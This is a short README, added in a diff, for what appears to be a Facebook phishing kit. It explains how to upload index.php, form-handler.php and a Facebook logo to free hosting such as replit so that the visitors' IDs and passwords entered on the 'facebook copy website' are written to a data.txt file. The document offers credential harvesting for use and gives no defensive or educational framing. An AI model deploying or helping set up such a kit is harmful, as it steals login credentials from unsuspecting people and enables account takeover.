@@ -1,0 +1,13 @@
+This is a made website which is a source code of real faceook ,
+
+<B> How to use it <B>
+
+Step 1: download index.php and form-handler.php file also download facebook.png
+Step 2: go to free web hosting like replit ;
+Step 3: upload sourse code file and run it
+
+
+  < Now you have a facebook copy website and if some inputs there the id and pass will come to your file data.txt >
+
+
+                                              THANKYOU    -- TheGreen
